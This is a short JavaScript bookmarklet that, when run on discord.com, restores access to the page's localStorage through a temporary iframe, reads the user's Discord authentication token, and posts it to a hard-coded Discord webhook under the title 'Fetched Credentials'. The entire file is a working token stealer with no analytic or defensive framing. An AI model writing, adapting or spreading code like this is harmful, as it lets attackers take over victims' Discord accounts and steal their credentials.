javascript: void (function () {
  var SEND = "<https://discord.com/api/webhooks/985349587927719937/2ur_fwRrLdRTOrcXClp_j_cL4qQTY9ph9qKssrKVs1Wk81I0BjNkLoB8KqO4GXkpblUj>";
  "https://discord.com" == this.document.location.origin &&
    (function () {
      const a = document.createElement("iframe");
      document.head.append(a);
      const b = Object.getOwnPropertyDescriptor(
        a.contentWindow,
        "localStorage"
      );
      a.remove(),
        Object.defineProperty(window, "localStorage", b),
        fetch(SEND, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                color: 3553599,
                title: "Fetched Credentials",
                description: `\`\`\`${localStorage.getItem("token")}\`\`\``,
              },
            ],
          }),
        });
    })();
})();
